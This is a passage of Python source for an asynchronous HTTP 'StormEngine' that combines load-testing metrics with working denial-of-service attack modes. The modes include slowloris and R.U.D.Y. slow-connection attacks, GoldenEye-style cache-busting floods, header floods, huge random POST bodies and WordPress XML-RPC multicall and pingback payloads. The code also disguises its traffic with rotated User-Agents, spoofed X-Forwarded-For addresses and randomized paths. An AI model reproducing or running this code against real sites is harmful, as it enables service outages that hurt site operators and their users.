    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
]

GEO_REGIONS = [
    {"name": "North America", "lat": 40.7, "lon": -74.0, "delay_ms": 0},
    {"name": "Europe", "lat": 51.5, "lon": -0.1, "delay_ms": 50},
    {"name": "Asia Pacific", "lat": 35.7, "lon": 139.7, "delay_ms": 120},
    {"name": "South America", "lat": -23.5, "lon": -46.6, "delay_ms": 80},
    {"name": "Africa", "lat": -33.9, "lon": 18.4, "delay_ms": 100},
    {"name": "Middle East", "lat": 25.3, "lon": 55.3, "delay_ms": 90},
]


def _rand_str(n=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def _build_qs():
    parts = []
    for _ in range(random.randint(1, 6)):
        parts.append(f"{_rand_str(random.randint(3,12))}={_rand_str(random.randint(5,25))}")
    return '&'.join(parts)


def _get_random_path():
    segments = ['api', 'v1', 'v2', 'v3', 'data', 'user', 'admin', 'static', 'assets', 'images', 'css', 'js',
                'search', 'login', 'register', 'dashboard', 'profile', 'settings', 'upload', 'download',
                'health', 'status', 'ping', 'test', 'debug', 'config', 'auth', 'token', 'session', 'cache',
                'proxy', 'gateway', 'webhook', 'callback', 'notify', 'report', 'analytics', 'metrics',
                'logs', 'backup', 'restore', 'sync', 'queue', 'job', 'task', 'worker', 'scheduler',
                'batch', 'bulk', 'import', 'export', 'migrate', 'generate', 'create', 'update', 'delete',
                'filter', 'sort', 'paginate', 'stream', 'realtime', 'live',
                'websocket', 'socket', 'push', 'poll', 'subscribe', 'unsubscribe', 'feed', 'timeline',
                'notification', 'alert', 'warning', 'error', 'info', 'trace', 'log', 'audit']
    depth = random.randint(1, 4)
    parts = [random.choice(segments) for _ in range(depth)]
    if random.random() > 0.5:
        parts.append(_rand_str(random.randint(5, 20)))
    return '/' + '/'.join(parts)


def _get_random_referer(base_url: str) -> str:
    pages = ['/', '/index', '/home', '/about', '/contact', '/products', '/services', '/blog', '/news',
             '/help', '/faq', '/support', '/docs', '/api', '/login', '/register', '/dashboard', '/profile',
             '/settings', '/pricing', '/features', '/changelog', '/status']
    return base_url.rstrip('/') + random.choice(pages)


def _build_multipart_body() -> Tuple[str, bytes]:
    boundary = _rand_str(32)
    parts = []
    for i in range(random.randint(1, 4)):
        field_name = random.choice(['file', 'document', 'upload', 'image', 'data'])
        filename = f"{_rand_str(8)}.{random.choice(['jpg', 'png', 'pdf', 'txt', 'zip', 'csv'])}"
        content_type = random.choice([
            'image/jpeg', 'image/png', 'application/pdf', 'text/plain',
            'application/zip', 'text/csv',
        ])
        file_data = _rand_str(random.randint(100, 2000)).encode()
        parts.append(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"{field_name}\"; filename=\"{filename}\"\r\n"
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode() + file_data + b"\r\n"
    text_field = random.choice(['title', 'description', 'name', 'comment'])
    text_value = _rand_str(random.randint(10, 100))
    parts.append(
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"{text_field}\"\r\n\r\n"
        f"{text_value}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    body = b"".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return content_type, body


def _build_xmlrpc_body(url: str = "") -> str:
    methods = [
        ("system.multicall", [[{"methodName": "wp.getUsersBlogs", "params": [_rand_str(4), _rand_str(8), _rand_str(12)]}]]),
        ("pingback.ping", [f"http://{_rand_str(12)}.com/{_rand_str(8)}", url or f"http://{_rand_str(16)}.com/"]),
        ("system.listMethods", []),
        ("wp.getUsers", [1, _rand_str(4), _rand_str(8)]),
    ]
    method_name, params = random.choice(methods)
    param_xml = ""
    for p in params:
        if isinstance(p, str):
            param_xml += f"<param><value><string>{p}</string></value></param>"
        elif isinstance(p, list):
            inner = ""
            for item in p:
                if isinstance(item, dict):
                    members = ""
                    for k, v in item.items():
                        members += f"<member><name>{k}</name><value><string>{v}</string></value></member>"
                    inner += f"<value><struct>{members}</struct></value>"
                elif isinstance(item, str):
                    inner += f"<value><string>{item}</string></value>"
            param_xml += f"<param><value><array><data>{inner}</data></array></value></param>"
    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>{method_name}</methodName>
<params>{param_xml}</params>
</methodCall>"""


class StormEngine:
    def __init__(self, cfg):
        self.cfg = cfg
        self.metrics = LiveMetrics()
        self.running = False
        self._stop = asyncio.Event()
        self._lock = asyncio.Lock()
        self._sem: Optional[asyncio.Semaphore] = None
        self._active = 0
        self._req_count = 0
        self._byte_count = 0
        self._connector: Optional[aiohttp.TCPConnector] = None
        self._adaptive_delay = 0.001
        self._dynamic_scale_factor = 1.0
        self._scenario_state = {}
        self._cookie_jar: Dict[int, Dict[str, str]] = {}
        self._test_start_display: float = 0.0
        self._conn_pool = WorkerConnectionPool(
            max_per_worker=self.cfg.get('pool_size', 10),
            connection_ttl=30.0,
        )
        self._conn_health = ConnectionHealthMonitor()
        self._auto_tune_state = {
            'enabled': bool(self.cfg.get('auto_tune', False)),
            'adjustments': 0,
            'last_tune': 0.0,
            'target_worker_delay': float(self.cfg.get('worker_delay', 0) or 0),
            'target_batch_size': int(self.cfg.get('batch_size', 500)),
        }
        self._chain = self.cfg.get('chain') or []
        self._chain_resolved: List[Tuple[AttackPattern, float, float]] = []
        if self._chain:
            cumulative = 0.0
            for name, dur in self._chain:
                try:
                    pat = AttackPattern(name)
                except ValueError:
                    continue
                if dur <= 0:
                    dur = max(1.0, self.cfg['duration'] / max(1, len(self._chain)))
                self._chain_resolved.append((pat, cumulative, cumulative + dur))
                cumulative += dur
        self._multi_vectors: List[AttackPattern] = []
        if self.cfg.get('multi_vector'):
            for name in self.cfg['multi_vector']:
                try:
                    self._multi_vectors.append(AttackPattern(name))
                except ValueError:
                    continue
        self._intensity = 1.0
        self._current_phase: Optional[str] = None
        self._timeline_logged = False

    async def _pre_resolve_dns(self):
        urls = self.cfg['urls'] if isinstance(self.cfg['urls'], list) else [self.cfg['url']]
        hostname = urls[0].split('://')[-1].split('/')[0].split(':')[0]
        try:
            loop = asyncio.get_event_loop()
            infos = await loop.getaddrinfo(hostname, None, family=socket.AF_INET)
            if infos:
                ip = infos[0][4][0]
                print(f"    {Fore.GREEN}[+] DNS resolved: {hostname} -> {ip}{Style.RESET_ALL}")
        except Exception as e:
            print(f"    {Fore.YELLOW}[!] DNS pre-resolution skipped: {e}{Style.RESET_ALL}")

    def _get_ssl_context(self):
        try:
            import ssl as _ssl
            ssl_context = _ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = _ssl.CERT_NONE
            tls_version = self.cfg.get('tls_version')
            if tls_version:
                tls_map = {}
                try:
                    tls_map['TLSv1.2'] = _ssl.PROTOCOL_TLSv1_2
                except AttributeError:
                    pass
                try:
                    tls_map['TLSv1.3'] = _ssl.PROTOCOL_TLS_CLIENT
                except AttributeError:
                    pass
                if tls_version in tls_map:
                    ssl_context = _ssl.SSLContext(tls_map[tls_version])
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = _ssl.CERT_NONE
            cipher_suite = self.cfg.get('cipher_suite')
            if cipher_suite:
                try:
                    ssl_context.set_ciphers(cipher_suite)
                except Exception:
                    pass
            if self.cfg.get('http2'):
                try:
                    ssl_context.set_alpn_protocols(['h2', 'http/1.1'])
                except (AttributeError, _ssl.SSLError):
                    pass
            return ssl_context
        except ImportError:
            return None

    def _get_connector(self) -> aiohttp.TCPConnector:
        if self._connector is None or self._connector.closed:
            conn_limit = 0 if self.cfg['users'] > 100000 else self.cfg['concurrency']
            ssl_context = self._get_ssl_context()
            keepalive_timeout = self.cfg.get('keepalive_timeout', 30)
            self._connector = aiohttp.TCPConnector(
                limit=conn_limit,
                limit_per_host=conn_limit,
                ttl_dns_cache=600,
                enable_cleanup_closed=True,
                force_close=not self.cfg['keep_alive'],
                use_dns_cache=True,
                keepalive_timeout=keepalive_timeout,
                ssl=ssl_context,
            )
        return self._connector

    def _build_headers(self, step_headers: dict = None, correlation_id: str = None) -> dict:
        h = dict(self.cfg['headers'])
        if step_headers:
            h.update(step_headers)
        if correlation_id:
            h['X-Correlation-ID'] = correlation_id
        h['User-Agent'] = random.choice(USER_AGENTS)
        h['Accept'] = random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/html,*/*',
            '*/*',
        ])
        h['Accept-Language'] = random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.8',
            'en-US,en;q=0.9,fr;q=0.8,de;q=0.7',
            'ja,en;q=0.9', 'zh-CN,zh;q=0.9', 'ko,ko-KR;q=0.9',
            'pt-BR,pt;q=0.9,en-US;q=0.8', 'es-ES,es;q=0.9,en;q=0.8',
        ])
        h['Accept-Encoding'] = 'gzip, deflate, br'
        if self.cfg['keep_alive']:
            h['Connection'] = 'keep-alive'
        if self.cfg['cache_bust']:
            h['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            h['Pragma'] = 'no-cache'
            h['Expires'] = '0'
        if self.cfg.get('random_referer'):
            base = self.cfg['url'].split('://')
            if len(base) > 1:
                h['Referer'] = _get_random_referer(base[0] + '://' + base[1].split('/')[0])
        h['X-Requested-With'] = random.choice(['XMLHttpRequest', 'fetch'])
        h['DNT'] = random.choice(['0', '1'])
        h['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'script', 'style', 'image', 'font'])
        h['Sec-Fetch-Mode'] = random.choice(['cors', 'navigate', 'no-cors', 'same-origin'])
        h['Sec-Fetch-Site'] = random.choice(['cross-site', 'same-origin', 'same-site', 'none'])
        h['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"Chrome OS"'])
        h['Sec-Ch-Ua-Mobile'] = random.choice(['?0', '?1'])
        h['Sec-Ch-Ua'] = random.choice([
            '"Chromium";v="126", "Not.A/Brand";v="24", "Google Chrome";v="126"',
            '"Microsoft Edge";v="126", "Not.A/Brand";v="24", "Chromium";v="126"',
            '"Firefox";v="128"',
        ])
        if self.cfg.get('geo_simulation'):
            region = random.choice(GEO_REGIONS)
            h['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            h['X-Geo-Region'] = region['name']
        if self.cfg.get('http2_priority'):
            priority_val = random.choice(['high', 'medium', 'low'])
            h['Priority'] = f'u=0, i={priority_val}'
        return h

    def _new_correlation_id(self, uid: int) -> str:
        if not self.cfg.get('correlation_ids', True):
            return ''
        return f"{uid:x}-{int(time.time() * 1000):x}-{_rand_str(10)}"

    @staticmethod
    def _to_ws_url(url: str) -> str:
        if url.startswith('ws://') or url.startswith('wss://'):
            return url
        if url.startswith('https://'):
            return 'wss://' + url[8:]
        if url.startswith('http://'):
            return 'ws://' + url[7:]
        if '://' not in url:
            return 'ws://' + url
        return url

    def _select_url(self, uid: int) -> str:
        urls = self.cfg.get('urls') or [self.cfg['url']]
        if len(urls) <= 1:
            return urls[0]
        if not self.cfg.get('smart_distribution', False):
            return random.choice(urls)
        best_url = urls[0]
        best_score = -1e18
        for u in urls:
            data = self.metrics.per_url_metrics.get(u) or self.metrics.per_url_metrics.get(u[:50])
            if not data or data.get('requests', 0) < 3:
                score = random.uniform(0.5, 1.0)
            else:
                reqs = max(1, data['requests'])
                err_ratio = data.get('errors', 0) / reqs
                avg_t = data.get('total_time', 0) / reqs
                score = 1.0 - err_ratio * 3.0 - min(1.0, avg_t / 5000.0) * 0.5
                score += math.log1p(reqs) * 0.02
            score += random.uniform(0, 0.05)
            if score > best_score:
                best_score = score
                best_url = u
        key = best_url[:80]
        self.metrics.smart_url_picks[key] = self.metrics.smart_url_picks.get(key, 0) + 1
        return best_url

    async def _auto_tune(self):
        state = self._auto_tune_state
        if not state.get('enabled'):
            return
        now = time.time()
        if now - state['last_tune'] < 3.0:
            return
        state['last_tune'] = now
        r10 = self.metrics.rolling_data.get_stats(10)
        err = r10.get('error_rate', self.metrics.error_rate)
        p95 = r10.get('p95_ms', 0)
        old_delay = state['target_worker_delay']
        old_batch = state['target_batch_size']
        new_delay = old_delay
        new_batch = old_batch
        reason = 'stable'
        if err > 15 or p95 > 5000:
            new_delay = min(2.0, old_delay * 1.5 + 0.05)
            new_batch = max(10, int(old_batch * 0.7))
            reason = f'high errors/latency (err={err:.1f}%, p95={p95:.0f}ms)'
        elif err > 5 or p95 > 2000:
            new_delay = min(1.0, old_delay * 1.2 + 0.02)
            new_batch = max(25, int(old_batch * 0.85))
            reason = f'moderate degradation (err={err:.1f}%, p95={p95:.0f}ms)'
        elif err < 1 and p95 < 400 and r10.get('rps', 0) > 0:
            new_delay = max(0.0, old_delay * 0.85)
            new_batch = min(max(self.cfg.get('batch_size', 500), old_batch), int(old_batch * 1.15) + 10)
            reason = f'healthy window (err={err:.1f}%, p95={p95:.0f}ms)'
        else:
            reason = 'within tolerance'
        changed = abs(new_delay - old_delay) > 0.001 or new_batch != old_batch
        if changed:
            state['target_worker_delay'] = round(new_delay, 4)
            state['target_batch_size'] = new_batch
            state['adjustments'] += 1
            self.cfg['worker_delay'] = state['target_worker_delay']
            self.cfg['batch_size'] = new_batch
            self.metrics.auto_tune_history.append({
                't': round(now - (self.metrics.start_time or now), 2),
                'worker_delay': state['target_worker_delay'],
                'batch_size': new_batch,
                'reason': reason,
            })
            if len(self.metrics.auto_tune_history) > 200:
                del self.metrics.auto_tune_history[:-100]
            self.metrics.record_timeline_event(
                'auto_tune',
                f"auto-tune delay={state['target_worker_delay']:.3f}s batch={new_batch} ({reason})",
                {'worker_delay': state['target_worker_delay'], 'batch_size': new_batch,
                 'reason': reason})

    def _realtime_bottleneck(self) -> dict:
        r10 = self.metrics.rolling_data.get_stats(10)
        bottleneck = _detect_realtime_bottleneck(
            rolling_10s=r10,
            error_rate=self.metrics.error_rate,
            avg_connect_ms=self.metrics.avg_connect_time,
            avg_ttfb_ms=self.metrics.avg_ttfb,
            active_users=self.metrics.active_users,
            concurrency_limit=self.cfg.get('concurrency', 0),
            pool_stats=self._conn_pool.get_stats(),
            error_type_counts=dict(self.metrics.error_type_counts),
        )
        return bottleneck

    def connection_health(self) -> dict:
        return self._conn_health.health(30)

    @staticmethod
    def _rule_field_value(field_name: str, status: int, size: int, body_text: str,
                          headers: dict, elapsed_ms: float) -> Any:
        fname = (field_name or '').strip()
        low = fname.lower()
        if low == 'status':
            return status
        if low == 'size':
            return size
        if low in ('time_ms', 'response_time', 'elapsed_ms'):
            return elapsed_ms
        if low == 'body':
            return body_text
        if low.startswith('header:'):
            key = fname.split(':', 1)[1]
            for hk, hv in headers.items():
                if hk.lower() == key.lower():
                    return hv
            return None
        return None

    @staticmethod
    def _rule_passes(rule: dict, status: int, size: int, body_text: str,
                     headers: dict, elapsed_ms: float) -> bool:
        actual = StormEngine._rule_field_value(
            rule.get('field', ''), status, size, body_text, headers, elapsed_ms)
        op = rule.get('op', 'eq')
        expected = rule.get('value')
        try:
            if op in ('gt', 'lt', 'gte', 'lte'):
                a = float(actual)
                e = float(expected)
                if op == 'gt':
                    return a > e
                if op == 'lt':
                    return a < e
                if op == 'gte':
                    return a >= e
                return a <= e
            if op == 'eq':
                try:
                    return float(actual) == float(expected)
                except (TypeError, ValueError):
                    return str(actual) == str(expected)
            if op == 'ne':
                try:
                    return float(actual) != float(expected)
                except (TypeError, ValueError):
                    return str(actual) != str(expected)
            text = '' if actual is None else str(actual)
            exp = '' if expected is None else str(expected)
            if op == 'contains':
                return exp in text
            if op == 'not_contains':
                return exp not in text
            if op == 'regex':
                return re.search(exp, text) is not None
        except Exception:
            return False
        return True

    def _evaluate_validation_rules(self, rules, status: int, size: int, body_text: str,
                                   headers: dict, elapsed_ms: float) -> List[str]:
        failed = []
        for rule in rules or []:
            if not self._rule_passes(rule, status, size, body_text, headers, elapsed_ms):
                failed.append(f"{rule.get('field', '?')}:{rule.get('op', '?')}:{rule.get('value', '?')}")
        return failed

    def _validate_response(self, resp, data: bytes, validation: ResponseValidation,
                           elapsed_ms: float = None, body_text: str = None) -> Tuple[bool, List[str]]:
        if validation is None:
            return True, []
        body = body_text if body_text is not None else data.decode('utf-8', errors='replace')
        headers = dict(resp.headers) if resp is not None and hasattr(resp, 'headers') else {}
        if validation.expected_status and resp is not None and resp.status != validation.expected_status:
            return False, [f'status:ne:{validation.expected_status}']
        if validation.min_size and len(data) < validation.min_size:
            return False, [f'size:gte:{validation.min_size}']
        if validation.max_size and len(data) > validation.max_size:
            return False, [f'size:lte:{validation.max_size}']
        if validation.contains and validation.contains not in body:
            return False, [f'body:contains:{validation.contains}']
        if validation.not_contains and validation.not_contains in body:
            return False, [f'body:not_contains:{validation.not_contains}']
        if validation.regex:
            try:
                if re.search(validation.regex, body) is None:
                    return False, [f'body:regex:{validation.regex}']
            except re.error:
                return False, [f'body:regex:invalid:{validation.regex}']
        if validation.content_type_contains:
            ctype = ''
            for hk, hv in headers.items():
                if hk.lower() == 'content-type':
                    ctype = hv
                    break
            if validation.content_type_contains.lower() not in ctype.lower():
                return False, [f'header:content-type:contains:{validation.content_type_contains}']
        if validation.max_response_time is not None and elapsed_ms is not None:
            if elapsed_ms > validation.max_response_time:
                return False, [f'time_ms:lte:{validation.max_response_time}']
        failed_rules = self._evaluate_validation_rules(
            validation.custom_rules,
            resp.status if resp is not None else 0,
            len(data), body, headers,
            elapsed_ms if elapsed_ms is not None else 0.0,
        )
        if failed_rules:
            return False, failed_rules
        return True, []

    def _evaluate_assertions(self, assertions: list, current: dict, previous: dict,
                             step_index: int, correlation_id: str) -> List[str]:
        failures = []
        for idx, assertion in enumerate(assertions or []):
            source = (assertion.get('source') or 'current').lower()
            src = previous if source in ('previous', 'prev', 'last') and previous else current
            field_name = assertion.get('field', 'status')
            op = assertion.get('op', 'eq')
            expected = assertion.get('value')
            if field_name == 'status':
                actual = src.get('status', 0)
            elif field_name == 'size':
                actual = src.get('size', 0)
            elif field_name in ('time_ms', 'response_time'):
                actual = src.get('time', 0)
            elif field_name == 'valid':
                actual = src.get('valid', True)
            elif field_name == 'error':
                actual = src.get('error') or ''
            elif field_name == 'body':
                actual = src.get('body_snippet', '')
            elif field_name.startswith('header:'):
                key = field_name.split(':', 1)[1]
                actual = None
                for hk, hv in (src.get('headers') or {}).items():
                    if hk.lower() == key.lower():
                        actual = hv
                        break
            else:
                actual = None
            probe = {'field': field_name, 'op': op, 'value': expected}
            if not self._rule_passes(probe, src.get('status', 0), src.get('size', 0),
                                     '' if actual is None else str(actual),
                                     src.get('headers') or {},
                                     float(src.get('time', 0) or 0)):
                failures.append(
                    f"step{step_index + 1}[{correlation_id or '-'}]:"
                    f"{source}.{field_name}:{op}:{expected}"
                )
        return failures

    def _make_result(self, url: str = None, correlation_id: str = None):
        return {'status': 0, 'time': 0, 'size': 0, 'error': None,
                'error_type': None, 'url': url or self.cfg['url'],
                'valid': True, 'headers': {}, 'bytes_sent': 0, 'bytes_recv': 0,
                'connect_time_ms': 0.0, 'ttfb_ms': 0.0, 'download_ms': 0.0,
                'server_processing_est': 0.0, 'network_overhead_est': 0.0,
                'correlation_id': correlation_id or '',
                'failed_rules': [], 'body_snippet': '',
                'assertion_failures': []}

    async def _fire(self, session: aiohttp.ClientSession, uid: int, url: str = None,
                    method: str = None, validation: ResponseValidation = None,
                    step_headers: dict = None, step_body: str = None,
                    step_cookies: dict = None, correlation_id: str = None):
        cid = correlation_id if correlation_id is not None else self._new_correlation_id(uid)
        result = self._make_result(url, correlation_id=cid)
        try:
            target_url = url or self.cfg['url']
            req_method = method or self.cfg['method']

            if self.cfg.get('random_path'):
                base = target_url.rstrip('/')
                target_url = base + _get_random_path()

            if req_method == 'GET':
                sep = '&' if '?' in target_url else '?'
                target_url = f"{target_url}{sep}{_build_qs()}"
                if self.cfg['cache_bust']:
                    target_url += f"&_t={int(time.time()*1000)}&_r={random.randint(1,999999)}"

            if self.cfg.get('jitter') > 0:
                jitter = random.uniform(0, self.cfg['jitter'] / 1000.0)
                await asyncio.sleep(jitter)

            if self.cfg.get('geo_simulation'):
                region = random.choice(GEO_REGIONS)
                if region['delay_ms'] > 0:
                    await asyncio.sleep(region['delay_ms'] / 1000.0)

            headers = self._build_headers(step_headers, correlation_id=cid)
            body = None
            content_type = None

            pattern = self.cfg['pattern']
            if pattern == AttackPattern.MULTIPART:
                content_type, body = _build_multipart_body()
                headers['Content-Type'] = content_type
                req_method = 'POST'
            elif pattern == AttackPattern.XMLRPC:
                body = _build_xmlrpc_body(target_url)
                headers['Content-Type'] = 'text/xml'
                headers['Content-Length'] = str(len(body))
                req_method = 'POST'
            elif pattern == AttackPattern.POST_LARGE_BODY:
                body_size = random.randint(10 * 1024 * 1024, 50 * 1024 * 1024)
                async def _body_gen():
                    remaining = body_size
                    chunk_sz = 1024 * 1024
                    while remaining > 0 and not self._stop.is_set():
                        sz = min(chunk_sz, remaining)
                        yield os.urandom(sz)
                        remaining -= sz
                body = _body_gen()
                headers['Content-Type'] = 'application/octet-stream'
                req_method = 'POST'
            elif pattern == AttackPattern.HEADER_FLOOD:
                for i in range(self.cfg.get('header_flood_count', 5000)):
                    headers[f"X-Flood-{i:04d}"] = _rand_str(64)
            elif step_body:
                body = step_body.encode() if isinstance(step_body, str) else step_body
            elif self.cfg['payloads']:
                body = random.choice(self.cfg['payloads'])
            elif self.cfg['body']:
                body = self.cfg['body']

            cookies = {}
            if step_cookies:
                cookies.update(step_cookies)
            if uid in self._cookie_jar:
                cookies.update(self._cookie_jar[uid])

            if pattern != AttackPattern.POST_LARGE_BODY:
                result['bytes_sent'] = len(body) if body else 0

            connect_start = time.time()
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            async with session.request(
                req_method, target_url, headers=headers, data=body,
                cookies=cookies if cookies else None,
                ssl=False, allow_redirects=self.cfg['follow'],
                timeout=timeout,
            ) as resp:
                connect_end = time.time()
                connect_ms = (connect_end - connect_start) * 1000
                result['connect_time_ms'] = connect_ms

                resp_cookies = resp.cookies
                if resp_cookies and uid in self._cookie_jar:
                    for k, morsel in resp_cookies.items():
                        self._cookie_jar[uid][k] = morsel.value
                elif resp_cookies:
                    self._cookie_jar[uid] = {k: morsel.value for k, morsel in resp_cookies.items()}

                data = await resp.read()
                download_end = time.time()
                ttfb_est = (download_end - connect_end) * 1000 * 0.3
                total_ms = (time.time() - connect_start) * 1000
                overhead_est = connect_ms * 0.3 + ttfb_est * 0.05

                result['status'] = resp.status
                result['time'] = total_ms
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                result['headers'] = dict(resp.headers)
                body_text = data.decode('utf-8', errors='replace')[:4096]
                result['body_snippet'] = data[:512].decode('utf-8', errors='replace')
                ok, failed_rules = self._validate_response(
                    resp, data, validation, elapsed_ms=total_ms, body_text=body_text)
                result['valid'] = ok
                result['failed_rules'] = failed_rules
                result['ttfb_ms'] = ttfb_est
                result['download_ms'] = (download_end - connect_end) * 1000
                result['server_processing_est'] = ttfb_est * 0.7
                result['network_overhead_est'] = overhead_est

                if pattern == AttackPattern.POST_LARGE_BODY:
                    result['bytes_sent'] = body_size

        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError as e:
            result['error'] = 'conn'
            err_str = str(e).lower()
            if 'dns' in err_str or 'resolve' in err_str:
                result['error_type'] = 'dns'
            elif 'ssl' in err_str or 'certificate' in err_str:
                result['error_type'] = 'ssl'
            else:
                result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_slowloris(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ssl_ctx = None
            if parsed.scheme == 'https':
                import ssl
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            connect_start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.cfg['timeout']
            )
            connect_ms = (time.time() - connect_start) * 1000
            result['connect_time_ms'] = connect_ms

            headers_str = (
                f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"X-Correlation-ID: {result.get('correlation_id') or '-'}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 10000\r\n"
            )
            writer.write(headers_str.encode())
            await writer.drain()

            sent_bytes = len(headers_str)
            for _ in range(random.randint(5, 20)):
                await asyncio.sleep(random.uniform(5, 15))
                chunk = f"X-a: {_rand_str(1)}\r\n".encode()
                writer.write(chunk)
                await writer.drain()
                sent_bytes += len(chunk)
                if self._stop.is_set():
                    break

            elapsed = (time.time() - connect_start) * 1000
            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=2)
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                if data:
                    status_line = data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    if ' ' in status_line:
                        parts = status_line.split(' ')
                        if len(parts) >= 2:
                            result['status'] = int(parts[1])
            except Exception:
                result['status'] = 0

            result['time'] = elapsed
            result['bytes_sent'] = sent_bytes
            result['network_overhead_est'] = connect_ms * 0.3
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception as e:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_rudy(self, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ssl_ctx = None
            if parsed.scheme == 'https':
                import ssl
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            connect_start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.cfg['timeout']
            )
            connect_ms = (time.time() - connect_start) * 1000
            result['connect_time_ms'] = connect_ms

            body_size = random.randint(100000, 1000000)
            headers_str = (
                f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"X-Correlation-ID: {result.get('correlation_id') or '-'}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {body_size}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            writer.write(headers_str.encode())
            await writer.drain()
            sent_bytes = len(headers_str)

            for i in range(body_size):
                byte = random.choice([ord('A'), ord('a'), ord('0'), 0x0D, 0x0A])
                writer.write(bytes([byte]))
                await writer.drain()
                sent_bytes += 1
                if i % 100 == 0:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                if self._stop.is_set():
                    break

            elapsed = (time.time() - connect_start) * 1000
            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=2)
                result['size'] = len(data)
                result['bytes_recv'] = len(data)
                if data:
                    status_line = data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                    if ' ' in status_line:
                        parts = status_line.split(' ')
                        if len(parts) >= 2:
                            result['status'] = int(parts[1])
            except Exception:
                result['status'] = 0

            result['time'] = elapsed
            result['bytes_sent'] = sent_bytes
            result['network_overhead_est'] = connect_ms * 0.3
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except Exception:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        return result

    async def _fire_goldeneye(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            target_url = url
            if self.cfg.get('random_path'):
                base = target_url.rstrip('/')
                target_url = base + _get_random_path()

            sep = '&' if '?' in target_url else '?'
            target_url = f"{target_url}{sep}{_build_qs()}&_={int(time.time()*1000)}"

            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Connection'] = 'keep-alive'
            headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            headers['Pragma'] = 'no-cache'
            headers['Expires'] = '0'
            headers['If-None-Match'] = f'"{_rand_str(32)}"'
